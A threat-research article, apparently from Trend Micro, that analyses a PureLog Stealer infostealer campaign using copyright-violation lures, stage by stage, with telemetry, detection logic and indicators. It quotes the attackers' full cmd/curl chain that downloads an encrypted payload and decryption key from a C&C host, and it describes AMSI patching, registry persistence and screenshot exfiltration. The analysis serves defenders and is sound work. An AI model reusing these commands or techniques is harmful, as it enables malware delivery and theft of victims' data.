# Copyright Lures Mask a Multi‑Stage PureLog Stealer Attack on Key Industries

- **Source :** trendmicro
- **URL :** https://www.trendmicro.com/en/research/26/c/copyright-lures-mask-a-multistage-purelog-stealer-attack.html
- **Date :** 2026-03-19

---

Malware

# Copyright Lures Mask a Multi‑Stage PureLog Stealer Attack on Key Industries

We look into a stealthy multi‑stage attack campaign that delivers PureLog Stealer entirely in memory using encrypted, fileless techniques.

By: Mohamed Fahmy, Allixon Kristoffer Francisco, Jonna Santos 2026/03/19 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

# Key takeaways

  * The PureLog stealer campaign we analyzed uses highly targeted, language‑matched lures disguised as legal copyright violation notices to increase user execution success.
  * A multi‑stage, evasive delivery chain combines encrypted payloads and remote key retrieval to hinder static analysis.
  * The malware relies on fileless execution, using a Python‑based loader and dual .NET loaders to run PureLog Stealer entirely in memory.
  * AMSI bypass, registry persistence, screenshot capture, and victim fingerprinting are all integrated into the loader for stealth and intelligence gathering.
  * Evidence from telemetry confirms C&C communication with PureLog‑associated infrastructure, targeting organizations in healthcare, government, hospitality, and education sectors.



# Introduction

We identified a targeted malware campaign delivering PureLog Stealer, an information‑stealing malware that uses multi‑stage packed assemblies to harvest sensitive data, including Chrome browser credentials, extensions, cryptocurrency wallets, and system information, through a file disguised as a legal copyright violation notice. It’s considered a low‑cost, easy‑to‑use infostealer, making it accessible even to less‑skilled threat actors. The attack likely relies on phishing emails that lure victims into downloading a malicious executable tailored to the victim’s local language.

Once executed, the malware deploys a multistage infection chain designed for evasion. Notably, it downloads an encrypted payload disguised as a PDF file, then retrieves the decryption password remotely from attacker-controlled infrastructure. Instead of using built-in decryption code, the campaign abuses a renamed WinRAR utility disguised as a PNG image to extract the payload.

The extracted payload launches a Python-based loader that decrypts and executes the final .NET PureLog Stealer malware in memory. The routine also incorporates anti-virtual machine techniques to evade automated analysis environments.

We have observed this campaign targeting healthcare and government organizations in Germany and Canada the most, demonstrating selective victimology and a structured, evasive delivery framework rather than simple mass malware distribution.

# Campaign overview

This campaign delivers PureLog Stealer through a structured, multi-stage infection chain designed to increase execution success and reduce detection.

## Targeted and localized delivery

The malicious executable is disguised as a copyright complaint and uses filenames written in the same language as the one used by the targeted victim (e.g. German-language lures were observed targeting Germany, while English-language variants were used in Canada).

The campaign is likely distributed via phishing emails containing a malicious download URL, rather than using direct attachments, allowing attackers to centrally control payload hosting and encryption. Note that as always, users should avoid clicking links in unsolicited or unexpected emails, as these campaigns rely heavily on social‑engineering tactics to trick victims into opening malicious download URLs.

## Targeting profile

We identified attacks against targets in the following countries and industries:****

**Industries**

  * Healthcare
  * Government
  * Hospitality
  * Education



**Countries**

  * Germany
  * Canada
  * United States
  * Australia



The localized delivery and industry-focused victim profile points to selective targeting rather than indiscriminate mass distribution.

The key traits we observed during our investigation of this campaign include:

  * DLL sideloading to initiate execution
  * Encrypted payload delivered as a PDF file
  * Remote password retrieval for decryption
  * Renamed WinRAR utility used for extraction
  * Python loader decrypting and executing a .NET PureLog Stealer payload



# Infection chain

The campaign follows a clearly structured, multi-stage infection sequence, with stage designed to blend legitimate system behavior with controlled payload delivery.

Figure 1 shows a step-by-step breakdown of the full execution chain we observed during analysis.

[ ![  Figure 1. Infection chain of the attack](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig1.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig1.png)

Figure 1. Infection chain of the attack

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig1.png)

## Stage 1: user executes malicious lure

The infection begins when the victim manually executes a file disguised as a legal notice:

_Dokumentation über Verstöße gegen Rechte des geistigen Eigentums.exe_ (translating to _Documentation on Intellectual Property Rights Violations.exe_)

This executable launches a command interpreter:

cmd.exe /c ...

The attack depends entirely on user interaction, with no exploit or vulnerability being used at this stage.

## Stage 2: decoy document

To reduce suspicion, the malware immediately opens a decoy PDF, displaying a benign-looking document while malicious actions continue in the background.

start "" ".\\_\document.pdf"

The purpose of this document is to distract the user and create a sense of legitimacy with the performed actions.

## Stage 3: encrypted payload

The malware downloads an encrypted payload from an attacker-controlled infrastructure:

curl -A "curl/meow_meow" -s -k -L "hxxps://quickdocshare[.]com/DQ" -o ".\\_\invoice.pdf"

Key technical details include:

  * Custom User-Agent: curl/meow_meow
  * -s (silent mode)
  * -k (ignore TLS validation)
  * -L (follow redirects)
  * Saved locally as _invoice.pdf



While labelled as a PDF, the file is actually an encrypted archive container.

## Stage 4: remotely retrieved password

Instead of embedding the archive password in the malware, it is retrieved dynamically from a separate endpoint:

curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ/key"

The response from this request is captured into a command-line variable (%i) and used for extraction. The malware does not contain a static, hardcoded password, making offline analysis significantly more difficult. The attacker can rotate passwords on a per‑victim basis, ensuring that each infection can be uniquely controlled or invalidated.

This design also prevents analysts from extracting the payload without active network access to the attacker’s infrastructure. Overall, the approach establishes an infrastructure‑controlled decryption model that gives the operator full remote control over when and how the payload is unlocked.

### Stage 5: archive extracted using renamed WinRAR

A file masquerading as a PNG image is executed:

  * _\\_FILE_2025년_재직증명서_원본.png_ (translating to _2025 Employment Certificate – Original_)



This file is actually a renamed WinRAR executable.

The extraction command:

".\\_\FILE_2025년_재직증명서_원본.png" x -p"%i" ".\\_\invoice.pdf" "C:\Users\Public\" -y

A more detailed explanation of the components used in this stage follows below:

  * x → Extract archive
  * -p"%i" → Use dynamically retrieved password
  * Output → C:\Users\Public\
  * -y → Overwrite automatically



This stage decrypts and extracts the next payload using legitimate archive functionality.

## Stage 6: archive cleanup

After successful extraction, the encrypted container is removed:

del ".\\_\invoice.pdf"

This reduces forensic artifacts and removes the encrypted staging file.

### Stage 7: switch to staging directory

The working directory is then changed to the following:

cd "C:\Users\Public\Windows"

This location mimics a legitimate Windows directory structure to reduce suspicion from the user

### Stage 8: fake system binary execution (second stage loader)

During this stage, the extracted payload is executed:

"C:\Users\Public\Windows\svchost.exe" "instructions.pdf"

The notable observations we identified during this stage include:

  * The file _svchost.exe_ is not the legitimate Windows component; it is a renamed _python.exe_ used to execute Python scripts
  * The file _instructions.pdf_ is the obfuscated Python script used as the loader for two .NET executables.



# Variant analysis: observed divergence from the initial chain

We identified a second infection chain sharing the same core toolset as the originally documented one. This consists of four stages exhibiting material operational differences from the previous infection chain, which are detailed in the table below.

**Stage** | **Chain 2 (initial activity)** | **Chain 1 (more recent activity)**  
---|---|---  
Payload delivery | Downloaded live from the command-and-control (C&C) server (quickdocshare[.]com/DQ) | Pre-bundled inside the dropper package  
Decryption key | Fetched separately from the C&C server (/DQ/key) — never on disk | Hardcoded in the command line: efvBE97W7Ke4RnZaDTXOJzgqa04EPfz9  
Final execution | svchost.exe "instructions.pdf" — logic inside binary | svchost.exe -c "exec(base64...)" — full Python routine inlined in command  
Infrastructure | Requires live C&C server — two endpoints contacted | No C&C server — fully offline after dropper runs  
  
Table 1. Differences between the two infection chains we analyzed

# TrendAI Vision One™ detection

On February 6, 2026, a TrendAI Vision One™ detection model, _Executable Download via Google Ads Malvertising_**,** was created to identify direct downloads of executable files (.exe, .dll, .bat, .msi) originating from URLs containing Google Ads tracking parameters such as _gclid_ , _gad_source_ , and _gad_campaignid_. This model addresses the growing threat of malvertising, where attackers abuse Google Ads infrastructure by embedding malicious links in sponsored ads to deliver malware.

The PureLog Stealer campaign is a notable example, distributing its payload through both phishing emails and Google Ads malvertising, with threat actors purchasing ad space and redirecting users to malicious download sites that utilize tracking parameters for monitoring and evasion. Leveraging telemetry, the Vision One model specifically targets internet downloads of executable files associated with Google Ads parameters, enhancing detection and prevention of these sophisticated attacks**.**

**Detection Logic:**  
**** The rule triggers when:

  * An internet download event is detected.
  * The request is for an executable file.
  * The URL contains Google Ads parameters.
  * The domain is not part of the whitelist.



**Condition:**

"eventsub and bin_download and google_ads_params and not 1 of whitelist_*" 

It detects direct executable file downloads through URLs containing the previously-mentioned Google Ads tracking parameters. This pattern is commonly abused by threat actors to distribute malware through malvertising campaigns that leverage legitimate Google Ads infrastructure.

# Identifying pivot artifacts

Using TrendAI Vision One™ EDR telemetry, we collected artifacts from the compromised endpoint. The execution of a malicious lure (_C:\Users[REDACTED]\Downloads\Notice of Alleged Violation of Intellectual Property Rights_1770380091603\Notice of Alleged Violation of Intellectual Property Rights.exe_), based on the file directory, was saved to the Downloads directory, providing us a hint that it was downloaded on to the machine.

Through Vision One, we verified that the malicious lure was downloaded through Chrome from an unknown source.

  * hxxps://cdn[.]eideasrl[.]it/Notice%20of%20Alleged%20Violation%20of%20Intellectual%20Property%20Rights_1770380091603[.]zip



[ ![Figure 2. Malicious Lure download from an unknown source](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/purelog-3a.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/purelog-3a.png)

Figure 2. Malicious Lure download from an unknown source

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/purelog-3a.png)

The ZIP file contains a shellcode loader that, once executed, spawned multiple subsequent processes as part of the infection chain. This command opens a decoy file, downloads and extracts a payload using a password from a remote source, cleans up evidence, and executes a potentially malicious file. The sequence is designed to deliver malware while minimizing detection.

2 - TELEMETRY_PROCESS_CREATE  
  
processCmd: cmd.exe /c start "" ".\\_\document.pdf" && curl -A "curl/meow_meow" -s -k -L "hxxps://quickdocshare[.]com/DQ" -o ".\\_\invoice.pdf" && for /f "delims=" %i in ('curl -A "curl/meow_meow" -s -k -L "hxxps://quickdocshare[.]com/DQ/key"') do ".\\_\FILE_2025년_재직증명서_원본.png" x -p"%i" ".\\_\invoice.pdf" "C:\Users\Public\" -y >nul && del ".\\_\invoice.pdf" && cd "C:\Users\Public\Windows" && "C:\Users\Public\Windows\svchost.exe" "instructions.pdf"

To further investigate what these commands and PDF files do, we used the following search query, which yielded evidence that strongly correlated with PureLog Stealer:****

**Search Query:** endpointHostName:[REDACTED] AND ("*document.pdf*" OR "*instructions.pdf*" OR "*invoice.pdf*")****

301 - TELEMETRY_DNS_QUERY  
  
processFilePath C:\Windows\System32\curl.exe  
processCmd curl -A "curl/meow_meow" -s -k -L "https://quickdocshare.com/DQ" -o ".\\_\invoice.pdf"

  * quickdocshare[.]com
  * dq[.]bestshoppingday[.]com
  * logs[.]bestshopingday[.]com (strongly associated with PureLog Stealer)



4 - TELEMETRY_PROCESS_LOAD_IMAGE

  * processFilePath C:\Users\Public\Windows\svchost.exe
  * processCmd "C:\Users\Public\Windows\svchost.exe" "instructions.pdf"


  * The svchost.exe file is the signed signed _python.exe_ file used to execute Python scripts.
  * The parent command downloads files, uses keys for potential decryption, deletes files, and launches a potentially malicious executable.



Multiple _.dll_ and _.pyd_ files were created under directory C:\Users\Public\Windows\:

  * C:\Users\Public\Windows\python314.dll
  * C:\Users\Public\Windows\DLLs\\_ctypes.pyd
  * C:\Users\Public\Windows\DLLs\libffi-8.dll
  * C:\Users\Public\Windows\DLLs\\_hashlib.pyd
  * C:\Users\Public\Windows\DLLs\libcrypto-3.dll
  * C:\Users\Public\Windows\DLLs\\_socket.pyd
  * C:\Users\Public\Windows\DLLs\\_ssl.pyd
  * C:\Users\Public\Windows\DLLs\libssl-3.dll
  * C:\Users\Public\Windows\DLLs\\_bz2.pyd
  * C:\Users\Public\Windows\DLLs\\_lzma.pyd
  * C:\Users\Public\Windows\DLLs\\_zstd.pyd



[ ![Figure 3. The malware-established persistence on the system](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig3.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig3.png)

Figure 3. The malware-established persistence on the system

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig3.png)

204 - TELEMETRY_CONNECTION_CONNECT_OUTBOUND

  * 166[.]0[.]184[.]127 (PureLog Stealer C&C server)
  * 172[.]64[.]80[.]1
  * 64[.]40[.]154[.]96



The malware performs antivirus enumeration to discover all antivirus products installed on the system.

[ ![Figure 4. Antivirus enumeration on the system](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig4.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig4.png)

Figure 4. Antivirus enumeration on the system

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig4.png)

901 - TELEMETRY_AMSI_EXECUTE  
  
processFilePath C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
  
processCmd powershell -NoProfile -WindowStyle Hidden -Command "Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct | ForEach-Object { $_.displayName }"  
  
parentCmd "C:\Users\Public\Windows\svchost.exe" "instructions.pdf"

# Process injection

[ ![Figure 5. Observed process injection attempt, leveraging svchost.exe as the target process.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig5.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig5.png)

Figure 5. Observed process injection attempt, leveraging svchost.exe as the target process.

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig5.png)

The following command launches Microsoft Edge and Google Chrome as a renderer process for an extension, using a temporary user profile, disabling the sandbox, and marking an insecure origin as secure. These flags are often used in automation or by malware to support evasion and isolation:

processFilePath C:\Users\Public\Windows\svchost.exe  
  
processCmd C:\Users\Public\Windows\svchost.exe C:\Users\Public\Windows\instructions.pdf 1  
  
eventSubId 701 - TELEMETRY_MODIFIED_PROCESS_CREATE_REMOTETHREAD  
  
objectCmd "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --user-data-dir="C:\Users\\[REDACTED]\AppData\Local\Temp\qs4hg1fa.prl" --extension-process --no-pre-read-main-dll --no-sandbox --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=9 --time-ticks-at-unix-epoch=-1770049222788996 --launch-time-ticks=353424829690 --metrics-shmem-handle=4156,i,299084443807041640,15390022656206001629,2097152 --field-trial-handle=2068,i,9344726561852850498,17132715209763330275,262144 --variations-seed-version --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=3988 /prefetch:9

# GZipped payload

We observed a GZip decompression to unpack the payload. It reports system details, security products, user information, external IP, and the path to a suspicious executable (svchost.exe in a non-standard location).

[ ![Figure 6. TrendAI Vision One™ telemetry showing a GZip Payload](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig6.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig6.png)

Figure 6. TrendAI Vision One™ telemetry showing a GZip Payload

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig6.png)

processFilePath C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe  
  
processCmd  
  
H4sIAAAAAAAEAFN6ysj1iJHrPiOXgpuLoZmbq7Ori6OTqbmTgZEpkDZ2dLF0djRxtrAwchNgVDIIz8xLyS8vVnBJTUvNS0kt0lEIKQIyFHwzk4vyFRwLUisU/PNSFRzzSjLLMotKi7UEYDoMDRXMTJwyS4xYTfSM9QysWEKLU4uchBOTilJLMlKLMpOzo/2DPRzDHWM9Dm5lDuIxM9EzMdAzNDXRszSLYvbTd0xgKWIHWptYmlNSpexsFQPSXxwTUJqUk5kcA7UlprgsOSO/uEQvtSK1iZHbIEXBIEPBIFfBoBgAZeNq1egAAAA=  
  
parentCmd C:\Users\Public\Windows\svchost.exe C:\Users\Public\Windows\instructions.pdf 2  
  
parentFilePath C:\Users\Public\Windows\svchost.exe

The decoding logics are:

  * Base64 Decode: The initial string is decoded.
  * GZip Decompress: The base64 decoded output reveals a GZip header.
  * Protobuf Deserialize: The decompressed data is deserialized using a Protocol Buffers (protobuf) schema.



[ ![Figure 7. CyberChef recipe to extract machine fingerprint done by the malware](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig7.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig7.png)

Figure 7. CyberChef recipe to extract machine fingerprint done by the malware

[ ![Figure 8. Decoded machine fingerprint](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig8.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig8.png)

Figure 8. Decoded machine fingerprint

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig8.png)

The following table shows the machine fingerprint performed by the malware on the machine:

Field | Value | Interpretation  
---|---|---  
1.1.1 | FD16FECEDAB57B025AB53AD9CA4C882F | Unique identifier, possibly a machine or session ID  
1.1.2 | 1 | Status code or flag (likely 'active' or 'success')  
1.1.4 | Windows Defender, Trend Micro Apex One Antivirus | Installed security products  
1.1.5 | Windows 11 64Bit | Operating system version  
1.1.6 | 4.3.0 | Possibly malware version, agent version, or tool version  
1.1.7 | User | User type or privilege level  
1.1.8 | [REDACTED][REDACTED] | Username and possibly location or machine name  
1.1.9 | 56001 | Possibly a process ID, port, or internal reference number  
1.1.10 | 64.40.154.96 | External IP address of the machine  
1.1.11 | N/A | Not available or not applicable (could be hostname, domain, or other info)  
1.1.12 | 4 | Possibly a code for status or category  
1.1.14 | Default | Profile or configuration used  
1.1.15 | C:\Users\Public\Windows\svchost.exe | Path to a suspicious executable (likely malicious)  
1.1.16 | 0d 0h 0m 0s | Uptime or runtime duration (just started)  
  
Table 2. Machine fingerprint with Interpretation

[ ![Figure 9. Opening Google Chrome with the page "PURE! CHROME](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig9.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig9.png)

Figure 9. Opening Google Chrome with the page "PURE! CHROME

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig9.png)

The malware launches Google Chrome and displays a minimal HTML page titled "PURE! CHROME".****

The archive notice of _Alleged Violation of Intellectual Property Rights_1770380091603.zip_ serves as a malicious lure band contains the components listed below. It was obtained from an unidentified external source:

  * hxxps://cdn[.]eideasrl[.]it/Notice%20of%20Alleged%20Violation%20of%20Intellectual%20Property%20Rights_1770380091603[.]zip (SHA256: 35efc4b75a1d70c38513b4dfe549da417aaa476bf7e9ebd00265aaa8c7295870)
  * _Notice of Alleged Violation of Intellectual Property Rights.exe_ , renamed _ADNotificationManager.exe_ (SHA256: 1539dab6099d860add8330bf2a008a4b6dc05c71f7b4439aebf431e034e5b6ff)
  * The file _urlmon.dll_ , shellcode loader (SHA256: ac591adea9a2305f9be6ae430996afd9b7432116f381b638014a0886a99c6287)



The URL quickdocshare[.]com is the source from which the encrypted payload (_invoice.pdf_) was received

The file _invoice.pdf_ extracts multiple files into C:\Users\Public\Windows\, including _svchost.exe_ (SHA1: f4532fc1e5d53a732fcc883f7125ceb06b985048), which is a renamed Python application

Two of the identified domains correspond to domains previously observed in the investigated incident.

  * mh[.]bestshopingday[.]com
  * quickdocshare[.]com
  * logs[.]bestsaleshoppingday[.]com 



We observed outbound connections were observed to the following IP addresses:

  * 172[.]64[.]80[.]1 (Cloudflare)
  * 166[.]0[.]184[.]127 (PureLog Stealer C&C server)
  * 64[.]40[.]154[.]96 ( Tier.Net Technologies LLC ) 



[ ![Figure 10. VirusTotal links the IP address 166\[.\]0\[.\]184\[.\]127 to PureLog Stealer, with instructions.pdf observed communicating with this C&C server.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig10.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig10.png)

Figure 10. VirusTotal links the IP address 166[.]0[.]184[.]127 to PureLog Stealer, with instructions.pdf observed communicating with this C&C server.

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig10.png)

# Sourcing the payload: completing the chain and attribution to PureLog Stealer

Without _instructions.pdf_ , we could not definitively identify the final payload or confirm the true malware family behind the activity. Although we were able to successfully reconstruct most of the infection chain, the absence of this file created a critical intelligence gap.

At the time of initial response, Incident Response (IR) teams were unable to retrieve the file _instructions.pdf_ from the affected host.

# Analysis of instructions.pdf

After obtaining _instructions.pdf_ , we performed static and behavioral analysis of the file. Despite its .pdf extension, the file was not actually a document, but rather functioned as a payload container used by the Python-based loader executed earlier in the chain.

  
This script is a fully functional Python loader targeting Windows systems. It is heavily obfuscated — every string is Base64-encoded and every numeric constant is hidden behind multi-term arithmetic expressions. When stripped of all noise, the script implements eight distinct capabilities operating in a specific execution order.

[ ![Figure 11. The Capabilities of instructions.pdf](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig11.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig11.png)

Figure 11. The Capabilities of instructions.pdf

## Capability 1: AMSI bypass

The script disables Windows Defender's Antimalware Scan Interface (AMSI) before loading its payload. It does this in two stages: Stage 1 patches the entry point of _AmsiScanBuffer_ with a MOV EAX, E_INVALIDARG + JMP instruction so the function always returns "not malicious". Meanwhile, stage 2 dynamically scans forward from the entry point to find any conditional jump instructions (JZ/JNZ) and replaces them with unconditional JMPs — ensuring the bypass holds even if Stage 1 is partially detected.

[ ![Figure 12. Python code patching AMSI in memory to bypass antivirus scanning](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig12.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig12.png)

Figure 12. Python code patching AMSI in memory to bypass antivirus scanning

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig12.png)

## Capability 2: reflective .NET assembly load via COM / CLR

After disabling AMSI, the script loads an encrypted .NET assembly entirely in memory, ensuring that no file is ever written to disk. It bootstraps the .NET CLR using raw COM vtable calls, constructs a SAFEARRAY containing the decrypted assembly bytes, and calls AppDomain.Load_3() to reflectively load and execute the payload. The calling convention is selected at runtime based on 32/64-bit architecture detection.

[ ![  Figure 13. XOR-decrypted .NET payload loaded and executed in memory](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig13.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig13.png)

Figure 13. XOR-decrypted .NET payload loaded and executed in memory

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig13.png)

## Capability 3: registry persistence

The script installs itself as a Windows autorun entry under the current user's registry Run key. It uses "_SystemSettings_ " as the value name, mimicking a legitimate Windows component to avoid suspicion. Before writing, it deletes any existing value to ensure the path is always current. This guarantees re-execution on every user login.

[ ![Figure 14. Python script establishing persistence](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig14.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig14.png)

Figure 14. Python script establishing persistence

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig14.png)

Capability 4: full-screen capture

The script captures the entire desktop at full resolution using Windows GDI APIs, extracts the raw 24-bit BGR pixel data, reverses the bottom-to-top GDI row order, and manually constructs a valid PNG file in memory, without using PIL/Pillow or writing any file to disk. The PNG is then Base64-encoded for embedding in the JSON exfiltration payload.

[ ![Figure 15. Desktop capture converted to PNG and Base64-encoded for exfiltration](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig15.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig15.png)

Figure 15. Desktop capture converted to PNG and Base64-encoded for exfiltration

## Capability 5: victim fingerprinting

Before exfiltrating the screenshot, the script collects three pieces of victim identity data: the machine hostname, the logged-in username, and the names of all installed antivirus products.

The AV enumeration is performed silently using the WMI command-line (WMIC) utility against the _SecurityCenter2_ WMI namespace. This is a common reconnaissance technique used to determine whether the victim is a high-value target and to inform subsequent payload selection.

[ ![Figure 16. Victim Machine Fingerprint ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig16.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig16.png)

Figure 16. Victim Machine Fingerprint 

## Capability 8: C&C exfiltration via HTTPS POST

All collected data is assembled into a JSON object and sent to the C&C server over HTTPS. To prevent duplicate submissions (for example after a reboot via the persistence Run key), the script maintains a state flag in a second registry key. After a successful HTTP 200 response, it writes a DWORD value of 1337 to CacheVersion under AppModel\StateRepository. On subsequent runs it reads this key first and exits early if it finds 1337.

[ ![Figure 17. Screenshot, Machine fingerprint exfiltration  ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig17.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig17.png)

Figure 17. Screenshot, Machine fingerprint exfiltration 

[ download ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig17.png)

# Steps to final stealer payload

The loader script (_instractions.py_) contains two XOR-encrypted .NET executable payloads encoded in Base64 . On execution, it decodes into _Dgrfauysx.exe_ and _Fsywsuac.exe_ , launching them concurrently. The script's own work is now complete, with everything that follows happening inside the .NET loaders.  
****

##  Stage 1: .NET loaders (Dgrfauysx.exe and Fsywsuac.exe)

Both loaders are structurally identical .NET assemblies protected by ConfuserEx, a state-machine-based obfuscator that fragments control flow across hundreds of switch-case branches, making static analysis extremely difficult. Despite the obfuscation, both assemblies follow the same decryption pipeline:

  * The loader calls ResourceManager.GetObject() with a hardcoded resource name (“Filkxqmxu” for Dgrfauysx, “Cgwcx” for Fsywsuac) to retrieve a large, encrypted byte blob from its embedded ResourceSet.
  * The blob is decrypted using TripleDES-CBC. Key and IV material are embedded as Base64 strings in the .NET #US (user-string) heap.
  * The decrypted output is a GZip-compressed .NET assembly (PE file).
  * The GZip stream is decompressed in memory via System.IO.Compression.GZipStream.
  * The resulting raw assembly bytes are loaded directly into the current AppDomain via Assembly.Load(), with no file ever written to disk.



The two-loader design (“Dgrfauysx” + “Fsywsuac” running concurrently) is a redundancy mechanism. If one loader is blocked or killed by an endpoint control, the other independently delivers and executes PureLog Stealer. Both loaders share the same C&C address and registry persistence key.****

#  Final Payload: PureLog Stealer (in-memory)

The assembly loaded by Assembly.Load() is PureLog Stealer, executed entirely within the managed heap of the loader process. Because no file is written, disk-based antivirus and endpoint detection tools scanning file creation events will see nothing. The loader performs a GC.Collect() and thread-cleanup pass to remove its own objects from the managed heap, leaving X Stealer as the only active .NET code in the process.

[ ![Figure 18. Infection chain for PureLog Stealer](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig18.png) ](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/fig18.png)

Figure 18. Infection chain for PureLog Stealer

Conclusion****

The PureLog Stealer campaign demonstrates a highly organized and multi‑layered infection chain that combines social engineering, staged payload delivery, and in‑memory execution to evade both detection and forensic analysis.

By disguising malicious executables as legal notices, using encrypted payloads masquerading as PDF files, remotely retrieving dynamic decryption keys, and leveraging a renamed WinRAR utility for extraction, the operators effectively minimize static indicators and hinder automated analysis. The Python‑based loader and dual .NET loaders introduce redundancy and fileless execution pathways, ensuring that the final PureLog Stealer payload is launched reliably and without leaving artifacts on disk.

Overall, this activity reflects a shift away from broad, opportunistic malware distribution toward more selective targeting, with observed victims in government, healthcare, education, and hospitality sectors across multiple countries. The combination of obfuscation, infrastructure‑controlled decryption, and in‑memory execution underscores the importance of behavioral detection, network telemetry, and proactive threat hunting in identifying and mitigating this advanced infostealer threat.

# Proactive security with TrendAI Vision One™ 

[TrendAI Vision One™](/en/business/products/one-platform.html) is the industry-leading AI cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. 

**TrendAI Vision One™ Threat Intelligence Hub**

[TrendAI Vision One™ Threat Intelligence Hub](/en/business/products/threat-intelligence.html) provides the latest insights on emerging threats and threat actors, exclusive strategic reports from TrendAI™ Research, and TrendAI Vision One™ Threat Intelligence Feed in the TrendAI Vision One™ platform. 

Emerging Threats:

[Copyright Lures Mask a Multi‑Stage PureLog Stealer Attack on Key Industries](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence_insights?name=Copyright%20Lures%20Mask%20a%20Multi%E2%80%91Stage%20PureLog%20Stealer%20Attack%20on%20Key%20Industries)

**TrendAI Vision One™ Intelligence Reports (IOC Sweeping)**

[Copyright Lures Mask a Multi‑Stage PureLog Stealer Attack on Key Industries](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence?intrusionSet=Copyright%20Lures%20Mask%20a%20Multi%E2%80%91Stage%20PureLog%20Stealer%20Attack%20on%20Key%20Industries)

**TrendAI Vision One™ Search App**

TrendAI Vision One™ customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

## Hunting Queries

detectionName:*PURELOGSSTEALER*

More hunting queries are available for TrendAI Vision One™ with [Threat Intelligence Hub](/en/business/products/threat-intelligence.html) entitlement enabled. 

# Indicators of Compromise (IOCs)

The indicators of compromise for this entry can be found [here](/content/dam/trendmicro/global/en/research/26/c/purelog-stealer/purelog-ioc.txt). 

Tags

[Malware](/en/research.html?category=trend-micro-research:threats/malware) | [Research](/en/research.html?category=trend-micro-research:article-type/research) | [Expert Perspective](/en/research.html?category=trend-micro-research:article-type/expert-perspective) | [Phishing](/en/research.html?category=trend-micro-research:threats/phishing) | [Cyber Threats](/en/research.html?category=trend-micro-research:threats/cyber-threats) | [Investigations](/en/research.html?category=trend-micro-research:article-type/investigations) | [Articles, News, Reports](/en/research.html?category=trend-micro-research:medium/article)

###  Authors 

  * Mohamed Fahmy

Threat Researcher

  * Allixon Kristoffer Francisco

Threat Intel Analyst

